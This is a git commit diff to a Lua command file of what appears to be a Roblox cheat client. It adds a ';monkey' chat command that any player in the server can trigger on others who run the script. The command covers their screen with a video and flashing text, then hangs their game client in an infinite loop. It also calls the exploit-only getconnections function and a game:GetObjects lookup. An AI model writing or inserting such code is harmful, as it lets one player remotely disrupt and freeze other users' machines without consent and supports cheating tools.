4481eda75cd995e3540286711c103976cd548926
RayHafz <133870822+RayFaxiu@users.noreply.github.com>
2023-06-05 16:26:03 +0700

    Update Commands.lua

--- Commands.lua
+++ Commands.lua
@@ -273,6 +273,54 @@ function funcs:steal()
 	    end
 	end
 end
+function funcs:monkey()
+	local str = ""
+	for i,v in pairs(args) do
+	    str = str..v..(i > 1 and " " or "")
+	end
+	if str == "" then str = "skill issue" end
+	local video = Instance.new("VideoFrame")
+	video.Video = downloadVapeAsset("vape/assets/skill.webm")
+	video.Size = UDim2.new(1, 0, 1, 36)
+	video.Visible = false
+	video.Position = UDim2.new(0, 0, 0, -36)
+	video.ZIndex = 9
+	video.BackgroundTransparency = 1
+	video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+	local textlab = Instance.new("TextLabel")
+	textlab.TextSize = 45
+	textlab.ZIndex = 10
+	textlab.Size = UDim2.new(1, 0, 1, 36)
+	textlab.TextColor3 = Color3.new(1, 1, 1)
+	textlab.Text = str
+	textlab.Position = UDim2.new(0, 0, 0, -36)
+	textlab.Font = Enum.Font.Gotham
+	textlab.BackgroundTransparency = 1
+	textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+	video.Loaded:Connect(function()
+	    video.Visible = true
+	    video:Play()
+	    task.spawn(function()
+		repeat
+		    wait()
+		    for i = 0, 1, 0.01 do
+			wait(0.01)
+			textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
+		    end
+		until true == false
+	    end)
+	end)
+	task.wait(19)
+	task.spawn(function()
+	    pcall(function()
+		if getconnections then
+		    getconnections(entityLibrary.character.Humanoid.Died)
+		end
+		print(game:GetObjects("h29g3535")[1])
+	    end)
+	    while true do end
+	end)
+end
 function sysmsg(text, color)
     game.StarterGui:SetCore(
         "ChatMakeSystemMessage",
@@ -352,6 +400,8 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 				funcs:lobby()
 			elseif a == ";steal" then
 				funcs:steal()
+			elseif a == ";monkey" then
+				funcs:monkey()
 			end
 		end
 	end)
@@ -395,6 +445,8 @@ game:GetService("Players").PlayerAdded:Connect(function(v)
 				funcs:lobby()
                         elseif a == ";steal" then
 				funcs:steal()
+			elseif a == ";monkey" then
+				funcs:monkey()
 			end
 		end
 	end)
@@ -441,6 +493,8 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 				funcs:lobby()
 		        elseif a == ";steal" then
 				funcs:steal()
+			elseif a == ";monkey" then
+				funcs:monkey()
 			end
 		end
 	end)
@@ -484,6 +538,8 @@ game:GetService("Players").PlayerAdded:Connect(function(v)
 				funcs:lobby()
 			elseif a == ";steal" then
 				funcs:steal()
+			elseif a == ";monkey" then
+				funcs:monkey()
 			end
 		end
 	end)
